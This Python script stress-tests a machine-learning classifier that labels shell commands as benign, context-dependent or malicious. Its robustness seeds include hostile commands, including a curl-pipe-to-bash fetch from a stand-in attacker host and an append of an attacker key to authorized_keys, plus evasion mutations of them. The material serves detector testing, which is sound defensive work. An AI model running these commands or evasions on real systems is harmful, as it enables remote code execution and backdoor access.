#!/usr/bin/env python3
"""Deep stress-test suite for the current Tier 1 gatekeeper checkpoint.

Runs the current active checkpoint through:
  - runtime parity checks (direct model vs engine internal labels)
  - hard-negative benchmark
  - expanded benign benchmark
  - held-out test confusion audit
  - robustness mutations
  - validation-selected threshold calibration
"""

from __future__ import annotations

import argparse
import csv
import json
import sys
from collections import Counter, defaultdict
from itertools import product
from pathlib import Path

import torch
from tqdm import tqdm

BASE_DIR = Path(__file__).resolve().parents[2]
LOG_DIR = BASE_DIR / "logs" / "tier1_stress"
LOG_DIR.mkdir(parents=True, exist_ok=True)
sys.path.insert(0, str(BASE_DIR))

from engine import GenosEngine
from scripts.benchmark.tier1_case_sets import build_expanded_benign_commands, build_hard_negative_cases
from scripts.training.trainer1 import LABEL_NAMES, resolve_data_path


def progress_bar(iterable, *, total: int | None = None, desc: str, unit: str) -> tqdm:
    return tqdm(
        iterable,
        total=total,
        desc=desc,
        unit=unit,
        dynamic_ncols=True,
        mininterval=0.1,
        smoothing=0.0,
    )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--prefix", default="c_current", help="Output filename prefix under logs/tier1_stress")
    parser.add_argument("--threshold-step", type=float, default=0.02, help="Grid step for threshold search")
    return parser.parse_args()


def load_csv_rows(filename: str) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    with Path(resolve_data_path(filename)).open("r", encoding="utf-8") as handle:
        reader = csv.DictReader(handle)
        for row in reader:
            rows.append(row)
    return rows


def init_engine() -> GenosEngine:
    return GenosEngine(
        t1_path=str(BASE_DIR / "models" / "gatekeeper.pt"),
        t2_path=str(BASE_DIR / "models" / "specialist_residual_a.pt"),
        gatekeeper_meta_path=str(BASE_DIR / "config" / "gatekeeper_meta.json"),
    )


def direct_predict(engine: GenosEngine, command: str) -> dict:
    text = command.lower().strip()
    encoded = engine.tokenizer(
        text,
        return_tensors="pt",
        truncation=True,
        padding="max_length",
        max_length=engine.max_length,
    ).to(engine.device)
    with torch.no_grad():
        outputs = engine.t1(encoded["input_ids"], encoded["attention_mask"])
        logits = outputs["verdict_logits"].squeeze(0)
        probs = torch.softmax(logits, dim=0)
        pred_idx = int(torch.argmax(probs).item())
    return {
        "logits": [float(x) for x in logits.detach().cpu().tolist()],
        "probs": {LABEL_NAMES[i]: float(probs[i].item()) for i in range(len(LABEL_NAMES))},
        "argmax_index": pred_idx,
        "label": LABEL_NAMES[pred_idx],
    }


def batched_direct_predict(
    engine: GenosEngine,
    commands: list[str],
    batch_size: int = 64,
    desc: str = "Direct inference",
) -> list[dict]:
    predictions: list[dict] = []
    normalized = [command.lower().strip() for command in commands]
    batch_starts = range(0, len(normalized), batch_size)
    for start in progress_bar(
        batch_starts,
        total=(len(normalized) + batch_size - 1) // batch_size,
        desc=desc,
        unit="batch",
    ):
        batch = normalized[start:start + batch_size]
        encoded = engine.tokenizer(
            batch,
            return_tensors="pt",
            truncation=True,
            padding="max_length",
            max_length=engine.max_length,
        ).to(engine.device)
        with torch.no_grad():
            outputs = engine.t1(encoded["input_ids"], encoded["attention_mask"])
            logits = outputs["verdict_logits"]
            probs = torch.softmax(logits, dim=1)
            pred_idxs = torch.argmax(probs, dim=1)
        for row_logits, row_probs, pred_idx in zip(logits.detach().cpu(), probs.detach().cpu(), pred_idxs.detach().cpu()):
            predictions.append(
                {
                    "logits": [float(x) for x in row_logits.tolist()],
                    "probs": {LABEL_NAMES[i]: float(row_probs[i].item()) for i in range(len(LABEL_NAMES))},
                    "argmax_index": int(pred_idx.item()),
                    "label": LABEL_NAMES[int(pred_idx.item())],
                }
            )
    return predictions


def runtime_predict(engine: GenosEngine, command: str) -> dict:
    result = engine.scan(command)
    return {
        "internal_label": result.get("internal_label", result.get("label")),
        "public_label": result.get("public_label", result.get("label")),
        "label_confidence": float(result.get("label_confidence", 0.0)),
        "gatekeeper": result.get("gatekeeper", {}),
        "label_probabilities": result.get("label_probabilities", {}),
    }


def compute_metrics(y_true: list[str], y_pred: list[str]) -> dict:
    labels = LABEL_NAMES
    total = len(y_true)
    accuracy = sum(1 for truth, pred in zip(y_true, y_pred) if truth == pred) / max(1, total)
    per_class = {}
    confusion = {}
    for true_label in labels:
        confusion[true_label] = {}
        for pred_label in labels:
            confusion[true_label][pred_label] = sum(
                1 for truth, pred in zip(y_true, y_pred) if truth == true_label and pred == pred_label
            )
    for label in labels:
        tp = confusion[label][label]
        fp = sum(confusion[other][label] for other in labels if other != label)
        fn = sum(confusion[label][other] for other in labels if other != label)
        precision = tp / max(1, tp + fp)
        recall = tp / max(1, tp + fn)
        f1 = 0.0 if precision + recall == 0 else 2 * precision * recall / (precision + recall)
        per_class[label] = {
            "precision": precision,
            "recall": recall,
            "f1": f1,
            "support": sum(1 for truth in y_true if truth == label),
        }
    macro_f1 = sum(per_class[label]["f1"] for label in labels) / len(labels)
    routing = Counter(y_pred)
    return {
        "accuracy": accuracy,
        "macro_f1": macro_f1,
        "per_class": per_class,
        "confusion_matrix": confusion,
        "routing_distribution": {label: routing.get(label, 0) / max(1, total) for label in labels},
    }


def evaluate_cases(
    engine: GenosEngine,
    cases: list[dict[str, str]],
    policy: dict | None = None,
    desc: str = "Evaluate cases",
) -> tuple[dict, list[dict[str, object]]]:
    y_true: list[str] = []
    y_pred: list[str] = []
    audit_rows: list[dict[str, object]] = []
    for case in progress_bar(cases, total=len(cases), desc=desc, unit="case"):
        direct = direct_predict(engine, case["command"])
        runtime = runtime_predict(engine, case["command"])
        predicted = direct["label"] if policy is None else apply_threshold_policy(direct["probs"], policy)
        y_true.append(case["label"])
        y_pred.append(predicted)
        audit_rows.append(
            {
                "bucket": case["bucket"],
                "command": case["command"],
                "true_label": case["label"],
                "predicted": predicted,
                "direct_label": direct["label"],
                "engine_internal_label": runtime["internal_label"],
                "engine_public_label": runtime["public_label"],
                "probs": direct["probs"],
                "runtime_probs": runtime["label_probabilities"],
            }
        )
    return compute_metrics(y_true, y_pred), audit_rows


def parity_check(engine: GenosEngine, cases: list[dict[str, str]]) -> dict:
    mismatches = []
    public_mapping_errors = []
    for case in progress_bar(cases, total=len(cases), desc="Runtime parity", unit="case"):
        direct = direct_predict(engine, case["command"])
        runtime = runtime_predict(engine, case["command"])
        if direct["label"] != runtime["internal_label"]:
            mismatches.append(
                {
                    "command": case["command"],
                    "expected": direct["label"],
                    "engine_internal_label": runtime["internal_label"],
                    "engine_public_label": runtime["public_label"],
                    "probs": direct["probs"],
                }
            )
        if direct["label"] == "Context_Dependent" and runtime["public_label"] != "Suspicious":
            public_mapping_errors.append(
                {
                    "command": case["command"],
                    "engine_internal_label": runtime["internal_label"],
                    "engine_public_label": runtime["public_label"],
                }
            )
    return {
        "cases_checked": len(cases),
        "mismatch_count": len(mismatches),
        "public_mapping_error_count": len(public_mapping_errors),
        "mismatches": mismatches[:50],
        "public_mapping_errors": public_mapping_errors[:50],
    }


def benign_false_positive_report(engine: GenosEngine, benign_cases: list[dict[str, str]]) -> dict:
    false_positives = []
    labels = Counter()
    for case in progress_bar(benign_cases, total=len(benign_cases), desc="Expanded benign audit", unit="case"):
        runtime = runtime_predict(engine, case["command"])
        labels[runtime["public_label"]] += 1
        if runtime["internal_label"] != "Benign":
            false_positives.append(
                {
                    "bucket": case["bucket"],
                    "command": case["command"],
                    "internal_label": runtime["internal_label"],
                    "public_label": runtime["public_label"],
                    "confidence": runtime["label_confidence"],
                }
            )
    return {
        "n": len(benign_cases),
        "fp_count": len(false_positives),
        "fp_rate": len(false_positives) / max(1, len(benign_cases)),
        "label_distribution": dict(labels),
        "examples": false_positives[:100],
    }


def build_error_audit(rows: list[dict[str, object]]) -> dict:
    grouped: dict[str, list[dict[str, object]]] = defaultdict(list)
    for row in rows:
        if row["true_label"] == row["predicted"]:
            continue
        error_type = f"{row['true_label']}->{row['predicted']}"
        grouped[error_type].append(row)
    return {error_type: entries for error_type, entries in grouped.items()}


def apply_threshold_policy(probs: dict[str, float], policy: dict[str, float]) -> str:
    if probs["Benign"] >= policy["benign_threshold"]:
        return "Benign"
    if probs["Malicious"] >= policy["malicious_threshold"]:
        return "Malicious"
    return "Context_Dependent"


def search_thresholds(val_rows: list[dict[str, str]], engine: GenosEngine, step: float) -> dict:
    predictions = batched_direct_predict(engine, [row["command"] for row in val_rows], desc="Validation inference")
    val_data = [
        {"truth": row["label"], "probs": prediction["probs"]}
        for row, prediction in zip(val_rows, predictions)
    ]

    best = None
    threshold_values = [round(x * step, 4) for x in range(int(0.40 / step), int(0.90 / step) + 1)]
    threshold_pairs = list(product(threshold_values, threshold_values))
    for benign_threshold, malicious_threshold in progress_bar(
        threshold_pairs,
        total=len(threshold_pairs),
        desc="Threshold grid",
        unit="combo",
    ):
        y_true = [row["truth"] for row in val_data]
        y_pred = [
            apply_threshold_policy(row["probs"], {"benign_threshold": benign_threshold, "malicious_threshold": malicious_threshold})
            for row in val_data
        ]
        metrics = compute_metrics(y_true, y_pred)
        ranking = (
            metrics["macro_f1"],
            metrics["per_class"]["Context_Dependent"]["recall"],
            metrics["per_class"]["Malicious"]["recall"],
            metrics["accuracy"],
        )
        if best is None or ranking > best["ranking"]:
            best = {
                "ranking": ranking,
                "benign_threshold": benign_threshold,
                "malicious_threshold": malicious_threshold,
                "val_metrics": metrics,
            }
    assert best is not None
    return best


def evaluate_dataset_rows(
    rows: list[dict[str, str]],
    engine: GenosEngine,
    policy: dict | None = None,
    desc: str = "Dataset inference",
) -> tuple[dict, list[dict[str, object]]]:
    predictions = batched_direct_predict(engine, [row["command"] for row in rows], desc=desc)
    y_true: list[str] = []
    y_pred: list[str] = []
    audit_rows: list[dict[str, object]] = []
    for row, prediction in zip(rows, predictions):
        predicted = prediction["label"] if policy is None else apply_threshold_policy(prediction["probs"], policy)
        y_true.append(row["label"])
        y_pred.append(predicted)
        audit_rows.append(
            {
                "bucket": "dataset",
                "command": row["command"],
                "true_label": row["label"],
                "predicted": predicted,
                "direct_label": prediction["label"],
                "engine_internal_label": None,
                "engine_public_label": None,
                "probs": prediction["probs"],
                "runtime_probs": None,
            }
        )
    return compute_metrics(y_true, y_pred), audit_rows


def mutate_command(command: str) -> list[str]:
    variants = [
        command,
        command.upper() if len(command) < 80 else command,
        f"  {command}  ",
        command.replace(" ", "   "),
        f"bash -lc '{command}'" if "'" not in command else command,
        f"{command} # comment",
    ]
    if command.startswith("curl http"):
        variants.extend(
            [
                command.replace("curl", "/bin/curl", 1),
                command.replace("| bash", "| /bin/bash", 1),
                f"bash -c \"$({command.replace('| bash', '')})\"",
            ]
        )
    if command.startswith("powershell"):
        variants.append(command.replace("powershell", "pwsh", 1))
    return list(dict.fromkeys(variants))


def robustness_report(engine: GenosEngine) -> dict:
    seeds = [
        {"command": "curl http://evil.example.com/a.sh | bash", "label": "Malicious"},
        {"command": "cat /etc/hostname", "label": "Context_Dependent"},
        {"command": "systemctl status nginx", "label": "Benign"},
        {"command": "ssh -D 1080 -fNq user@10.0.0.1", "label": "Context_Dependent"},
        {"command": "echo ssh-rsa AAAAB3Nza attacker >> ~/.ssh/authorized_keys", "label": "Malicious"},
        {"command": "scp backup.tar.gz ops@10.0.0.8:/srv/backups/", "label": "Benign"},
    ]
    mismatches = []
    total = 0
    for seed in progress_bar(seeds, total=len(seeds), desc="Robustness seeds", unit="seed"):
        for variant in mutate_command(seed["command"]):
            total += 1
            label = runtime_predict(engine, variant)["internal_label"]
            if label != seed["label"]:
                mismatches.append(
                    {
                        "seed": seed["command"],
                        "expected": seed["label"],
                        "variant": variant,
                        "predicted": label,
                    }
                )
    return {
        "total_variants": total,
        "mismatch_count": len(mismatches),
        "mismatches": mismatches[:100],
    }


def main() -> None:
    args = parse_args()
    print("[1/8] Loading engine and datasets...", flush=True)
    engine = init_engine()
    hard_negative_cases = build_hard_negative_cases()
    benign_cases = build_expanded_benign_commands()
    val_rows = load_csv_rows("gatekeeper_3class_val.csv")
    test_rows = load_csv_rows("gatekeeper_3class_test.csv")

    print(f"      hard negatives: {len(hard_negative_cases)}", flush=True)
    print(f"      expanded benign: {len(benign_cases)}", flush=True)
    print(f"      validation rows: {len(val_rows)}", flush=True)
    print(f"      held-out test rows: {len(test_rows)}", flush=True)

    print("[2/8] Checking runtime parity across hard negatives...", flush=True)
    parity = parity_check(engine, hard_negative_cases)
    print("[3/8] Evaluating hard-negative benchmark...", flush=True)
    hard_negative_metrics, hard_negative_rows = evaluate_cases(engine, hard_negative_cases, desc="Hard negatives")
    print("[4/8] Auditing expanded benign false positives...", flush=True)
    benign_report = benign_false_positive_report(engine, benign_cases)
    print("[5/8] Evaluating held-out test split...", flush=True)
    test_metrics, test_rows_audit = evaluate_dataset_rows(test_rows, engine, desc="Held-out test")
    print("[6/8] Searching validation thresholds...", flush=True)
    threshold_policy = search_thresholds(val_rows, engine, args.threshold_step)
    print("[7/8] Applying threshold policy to test and hard negatives...", flush=True)
    threshold_test_metrics, threshold_test_rows = evaluate_dataset_rows(test_rows, engine, policy=threshold_policy, desc="Thresholded test")
    threshold_hard_metrics, threshold_hard_rows = evaluate_cases(engine, hard_negative_cases, policy=threshold_policy, desc="Thresholded hard negatives")
    print("[8/8] Running robustness mutations...", flush=True)
    robustness = robustness_report(engine)

    summary = {
        "active_model_path": str(BASE_DIR / "models" / "gatekeeper.pt"),
        "active_meta_path": str(BASE_DIR / "config" / "gatekeeper_meta.json"),
        "parity": parity,
        "hard_negative": {
            "n": len(hard_negative_cases),
            "metrics": hard_negative_metrics,
            "error_audit_path": str(LOG_DIR / f"{args.prefix}_hard_negative_errors.json"),
        },
        "expanded_benign": benign_report,
        "held_out_test": {
            "n": len(test_rows),
            "metrics": test_metrics,
            "error_audit_path": str(LOG_DIR / f"{args.prefix}_test_errors.json"),
        },
        "threshold_policy": {
            "benign_threshold": threshold_policy["benign_threshold"],
            "malicious_threshold": threshold_policy["malicious_threshold"],
            "validation_metrics": threshold_policy["val_metrics"],
            "test_metrics": threshold_test_metrics,
            "hard_negative_metrics": threshold_hard_metrics,
        },
        "robustness": robustness,
        "temperature_scaled_argmax_note": "Argmax labels are invariant under temperature scaling; use threshold calibration for decision changes.",
    }

    (LOG_DIR / f"{args.prefix}_summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    (LOG_DIR / f"{args.prefix}_hard_negative_errors.json").write_text(json.dumps(build_error_audit(hard_negative_rows), indent=2), encoding="utf-8")
    (LOG_DIR / f"{args.prefix}_test_errors.json").write_text(json.dumps(build_error_audit(test_rows_audit), indent=2), encoding="utf-8")
    (LOG_DIR / f"{args.prefix}_threshold_test_errors.json").write_text(json.dumps(build_error_audit(threshold_test_rows), indent=2), encoding="utf-8")
    (LOG_DIR / f"{args.prefix}_threshold_hard_negative_errors.json").write_text(json.dumps(build_error_audit(threshold_hard_rows), indent=2), encoding="utf-8")

    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()